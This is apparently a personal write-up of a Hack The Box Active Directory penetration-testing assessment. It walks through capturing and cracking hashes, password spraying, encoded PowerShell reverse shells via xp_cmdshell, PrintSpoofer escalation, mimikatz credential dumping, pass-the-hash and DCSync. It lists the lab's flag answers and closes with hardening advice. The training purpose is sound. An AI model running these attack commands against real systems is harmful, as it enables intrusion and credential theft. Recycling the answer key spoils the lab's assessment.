---
platform: hackthebox
difficulty: unknown
status: Completed
date: 2026-10-09
tags:
---
# HTB: AD Enumeration & Attacks - Skills Assessment Part II

**Targets:** 

| Host-Name                 | IP-Addresses                                       |
| ------------------------- | -------------------------------------------------- |
| ** ACADEMY-EA-PAR01-SA2** | `10.129.*.*` (External), `172.16.7.240` (Internal) |
| **DC01**                  | `172.16.7.3`                                       |
| **MS01**                  | `172.16.7.50`                                      |
| **SQL01**                 | `172.16.7.60`                                      |



---

## 01 - Scope
### Assignment:
Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

### Objectives:
- **Primary Goals:**
  - [x] Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
`AB920`
  - [x] What is this user's cleartext password?
`wasal`
  - [x] Submit the contents of the C:\flag.txt file on MS01.
`aud1t_gr0up_m3mbersh1ps!`
  - [x] Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
`BR086`
  - [x] What is this user's password?
`Welcome1`
  - [x] Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
`D@ta_bAse_adm1n!`
  - [x] Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
`s3imp3rs0nate_cl@ssic`
  - [x] Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
`exc3ss1ve_adm1n_r1ights!`
  - [x] Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
`CT059`
  - [x] Crack this user's password hash and submit the cleartext password as your answer.
`charlie1`
  - [x] Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
`acLs_f0r_th3_w1n!`
  - [x] Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
`7eba70412d81c1cd030d72a3e8dbe05f`


---

## 02 - Procedure
1. I connected to the internal attack host `ACADEMY-EA-PAR01-SA2` via `RDP`:
```bash
xfreerdp /v:10.129.161.217 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /cert:ignore
```

2. Than I checked what our target subnet will be, most likely `172.16.6.0/23`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009090515.png)

3. Afterwards I set up a `ligolo-tunnel` to the "target attack box" , so I can use my own machine and tools:
Starting listener on local attack-box:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```
Adding route on local attack-box:
```bash
sudo ip route add 172.16.6.0/23 dev ligolo
```
Pulling agent on remote attack-box (via python http-server):
```bash
wget http://10.10.15.206:8000/ligolo-ng_agent_0.9.1_linux_amd64
```
And connecting back from the remote attack box to my local one:
```bash
./ligolo-ng_agent_0.9.1_linux_amd64 -connect 10.10.15.206:11601 -ignore-cert
```

4. I then executed a ping sweep on the target network with `nmap`:
```bash
sudo nmap -sn -v -PS80,445,3389,22,135 172.16.6.0/23
```
And discovered following hosts (172.16.7.240 is the remote attack box and therefor not interesting):
`172.16.7.3
`172.16.7.50
`172.16.7.60
`172.16.7.240`

5. So I scanned the 3x unknown hosts and enumerated their running services:
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 172.16.7.3 > 03
```

```bash
nmap -p 53,135,139,445 -sC -sV 172.16.7.3 | tee d03
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009094115.png)


```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 172.16.7.50 > 50
```

```bash
nmap -p 135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,49672 -sC -sV 172.16.7.50 | tee d50
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009094528.png)


```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 172.16.7.60 > 60
```

```bash
nmap -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sC -sV 172.16.7.60 | tee d60
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009094913.png)


6. Alright, we discovered the `DC01` , `MS01` ,`SQL01` and there running services.
7. Our current situation is that we don't have any login credentials for either the servers or the services. This means we first need a strategy to gain an initial `foothold`. A simple way to obtain login credentials on the network is to use `Wireshark` or `TCPdump`. Since wireshark isn't working on our remote attack box, I used tcpdump and listened on the "internal" interface.:
```bash
tcpdump -i ens224 -v
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009102404.png)
And Bingo! A process is looking via `NBT-NS` for a name which doesn't exit and broadcasts it throughout the network. We can exploit this by responding to the request and pretending to be the nonexistent PC. This way, the process authenticates itself on to machine, and we obtain the credentials.

8. We can simply accomplish this by using `responder` on the remote attack box:
```bash
sudo responder -I ens224
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009104022.png)

9. Now we can try to crack the password hash of the user`AB920` with hashcat:
```bash
 hashcat -m 5600 responder /usr/share/wordlists/rockyou.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009104430.png)

10. I than tried to connect to the server `MS01`, which is the only server with `RDP` open:
```bash
xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /dynamic-resolution /cert:ignore
```

And like that, we now have an initial `foothold` and the first flag:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009105519.png)

11. Afterwards I checked, if there are any  `ASREP roastable accounts` or `SPNs` with `PowerView`, there arent':
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```powershell
Get-DomainUser * -spn | select samaccountname,memberof
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009115237.png)

12. I then continued with `Snaffler.exe` to check if it can find any files containing passwords or credentials. 
```powershell
Snaffler.exe -s -m "C:\temp\loot" -o "C:\temp\snaffler.log"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009120848.png)

13. Even tho `snaffler` didn't find anything useful, it revealed a share on the `DC01` :
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009120956.png)
But all of them seemed to be empty:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009121152.png)

14. Since there hasn't been any progress on further compromise attempts so far, I've switched to `password spraying`.
I first checked the domains `password policy` with `PowerView`:
```powershell
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009121940.png)
The good thing is, that the password policy is really weak and there's no account lockout:
- `MinimumPasswordLength = 1` = no min. password length
- `PasswordComplexity = 0` = no uppercase or special characters required
- `LockoutBadCount = 0` = no Account lockout, meaning "infinite" bruteforce attempts
The bad thing is, I literally have no clue how to approach this. I mean there are millions of potential passwords....after checking online what common practices are I put a little `pwlist` together:
```pwlist
weasal
password
Password
123456
admin
qwerty
qwertz 
inlanefreight
```
and enumerated all the domain-users with `PowerView`:
```powershell
(Get-DomainUser).samaccountname | Out-File -FilePath "C:\Users\AB920\Documents\Userlist.txt"
```
I then copied the contents of the list to my local attack box and started a `password spraying attack` with `kerbrute` and a "while loop":
```bash
while read -r password; do
  /run/media/breezy/PortableSSD/THM/Scripts/kerbrute_linux_amd64 passwordspray -d inlanefreight.local --dc 172.16.7.3 users "$password"
done < pwlist
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261009131916.png)
I added the user `AB920` at the top of the list, just to make sure the syntax is correct. His account appeared also later in the list, that's why we see him two times her. Unfortutnately none of the passwords from my list worked.

15. I then executed `bloodhound` to gather more information and potentially revealing a weakness:
```bash
sudo bloodhound-python -u 'AB920' -p 'weasal' -ns 172.16.7.3 -d inlanefreight.local -c all
```
Th user didn't had any extraordinary rights:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010102952.png)

16. At this point I looked up a walkthrough... and the `password spraying` would have been the right step, but the correct password would have been `Welcome1`. RNG based Matchmaking.
So I confirmed "my finding" with `kerbrute`:
```bash
/run/media/breezy/PortableSSD/THM/Scripts/kerbrute_linux_amd64  passwordspray -d inlanefreight.local --dc 172.16.7.3 userlist 'Welcome1'
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010115129.png)

Earlier whilst enumerating further, I discovered, that most users have a name in their `name field`.  
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010121526.png)
Since I was curious, if some users, use their name or maybe even username as their password I created a new `combolist` with them combined:
I first created the list:
```bash
awk '{                    
  user=$1; fn=$2; ln=$3;
  print user, user;
  print user, fn;
  print user, tolower(fn);
  print user, toupper(fn);
  print user, ln;
  print user, tolower(ln);
  print user, toupper(ln);
}' users.txt | sort -u > user_combos.txt
```
The `combolist` is structured like this:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010121829.png)

After trying to use it with `kerbrute` i realized, that the format needs to be `username:password` so I corrected that:
```bash
sed 's/ /:/' user_combos.txt > combolist.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010121947.png)

And then I executed`kerberute` with the `combolist`:
```bash
cat combolist.txt | /run/media/breezy/PortableSSD/THM/Scripts/kerbrute_linux_amd64  bruteforce -d inlanefreight.local --dc 172.16.7.3 -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010124843.png)
It didn't find anything, but could be handy for future practices and pentests. 

17. I then connected via `RDP` to `MS01`with the user `BR086`. There I discovered the `web.config` file on the `DC01` share. Which contained possible `SQL-Credentials`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010122950.png)

18. So I tried to connect to the server`SQL01`and the credentials were valid!
```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py netdb@172.16.7.60
```
Turns out  `XP_cmdshell` is configured, our user is `sysadmin` and he has some interesting privileges:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261010124050.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012082438.png)
The `SeImpersonatePrivilige` allows our user to elevate the identity and permissions of a process. Allowing us to elevate e.g. a reverse shell to the context of `NT Authority`.  This weakness can be utilized by scripts like `Juicy Potato`  and `Printspoofer` or also via `Metasploit`.

19. So I generated a `reverse-shell` with:  https://www.revshells.com/
Started the `nc-listener` on the remote attackbox:
```bash
nc -lvnp 4444
```
And execute the reverse-shell on the server `SQL01`:
```powershell
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
output 
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012084514.png)

21. Once connected as `nt service\mssql$sqlexpress` I downloaded the `PrintSpoofer.exe` from the remote attack box ... 
```powershell
Invoke-WebRequest -Uri "http://172.16.7.240:8000/PrintSpoofer64.exe" -OutFile "C:\Users\Public\printspoofer.exe"
```
... and executed it. Which started a new powershell session as `NT authority\system`, where I then established a new reverse shell with elevated privileges:
```bash
.\printspoofer.exe -c "powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADUANQA1ADUAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAwACkAewAkAGQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAdAByAHkAewAkAG8APQBpAGUAeAAgACQAZAAgADIAPgAmADEAIAAzAD4AJgAxACAANAA+ACYAMQAgADUAPgAmADEAIAA2AD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwB9AGMAYQB0AGMAaAB7ACQAbwA9ACQAXwB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBpAGYAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBFAG0AcAB0AHkAKAAkAG8AKQApAHsAJABvAD0AIgAiAH0AJABwAD0AIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwBbAGIAeQB0AGUAWwBdAF0AJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwArACQAcAApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA="
```
That way I was able to retrieve the flag on the Administrators dektop:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012091058.png)

22. I then proceeded with downloading `mimikatz.exe` and dumping the hashes from `lsass.exe`:
```powershell
Invoke-WebRequest -Uri "http://172.16.7.240:8000/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
```

```powershell
./mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit > hashdump.txt
```
I found the ntlm-hash of the user `mssqlsvc`, but was not able to crack it:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012092133.png)
Therefor I continued with harvesting the `SAM-DB` & `System-Hive`, which I transferred over the remote attackbox to my local attackbox:
```powershell
reg save hklm\sam C:\Users\Public\sam.hiv
reg save hklm\system C:\Users\Public\system.hiv
```
Remote Attackbox, transfer to `smbshare`:
```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support -username admin -password JustaPass
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012110849.png)

Download to my local Attackbox via `http.server`:
```bash
wget http://10.129.181.19:8000/sam.hiv 
wget http://10.129.181.19:8000/system.hiv 
```

23. I then extracted the password hash of the `local Administrator` but couldn't crack it:
```bash
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

24. So I tried to pass the hash over `WinRM` and Bingo! The same password was used for this server, which provides us with the next flag:
```bash
evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012112318.png)

25. Next up we will need to obtain the credentials of a user with `Generic All` writes. In hope of finding it, I transferred and run `mimikatz.exe` on the server `MS01` to, but didn't find anything new. 
26. I then uploaded `SharpHound.exe` to the server `SQL01` where we have system rights and thus access to the `machine account`. After executing it, i transferred the `.zip` back to my local attackbox as before and loaded it into bloodhound:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012123922.png)
`Shortest paths to Domain Admin` revealed, that the user `CT059` is the one with `Generic All` rights over the object `Domain Admin`.
This is where I realized, that I could have also figured that out way earlier with my first bloodhound scan as  user `AB920`.

27. Next I uploaded `Inveigh.exe` to the server and once again listened for any incoming connections/authentication:
```evil-winrm
upload /run/media/breezy/PortableSSD/THM/Scripts/SharpCollection/NetFramework_4.7_x64/Inveigh.ex
```
And there is the user `CT059`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012115855.png)
Lets try to crack it with hashcat:
```bash
 hashcat -m 5600 responder /usr/share/wordlists/rockyou.txt
```
Nice, we obtained his credentials!
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012120247.png)

27. I then connected via RDP to `MS01` as user `CT059` and added himself to the `domain Sdmin` group with `PowerView`:
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Member "CT059"
```

28. Afterwards i reestablished the RDP-Session, but this time with `domain Admin` rights. This enabled the user to access the `flag.txt` on the `DC01` Administrators Desktop.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012130516.png)

29. Last but not least I executed `mimikatz` on the server`MS01` as domain admin and performed a `DC-Sync Attack` to retrieve the hash of the user `krbtgt`:
```powershell
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261012131150.png)

## 03 - Hardening Steps
1. Implement GPO which deactivates `LLMNR` & `NetBIOS`
2. Set Passwordpolicy, e.g.
	- min. 12 Characters
	- min. 1x Number
	- min. 1x Special Character
	- activate account lockout after 5x attempts and lock for 30 minutes
3. Don't save cleartext credentials in configuration files such as `web.config`
	- Implement `Group Managed Service Accounts` for services and applications
4. Disable `XP_cmdshell` if not vital
5. Enable `LAPS` to prevent the reuse of local Admin credentials
6. Conduct periodic internal security audits and restrict critical ACL's/permissions:
	- If possible disable `SeImpersonatePrivilege`  for any user
	- Make sure that no regular users have `GenericAll, GenericWrite, WriteDACL` over highly critical objects such as `domain admin`
7. Introduce `EDR & SIEM` so that the execution of known malicious applications, such as Mimikatz, PowerView, or PrintSpoofer is blocked and reported.

## 10 - Lesson Learned 
1. **Bloodhound** - It doesn't really matter if the scan is performed as a normal `domain-user` or with a `machine-account`, there is not much of a difference if at all. Also the function `Shortes paths to Domain Admins` can be really handy, especially whilst making a "game-plan"!
2. **File Transfer** - `Base64` isn't suited for transferring `hives`. Even tho it barely works for the `sam db`, it can crash the servers with the system or security hive. (Of course, that depends a lot on the server's performance and the size of its Hive database)
3. **Responder/Inveigh** - It's worth running responder/inveigh on all compromised servers, as this allows you to intercept the unicast authentication requests sent to the server.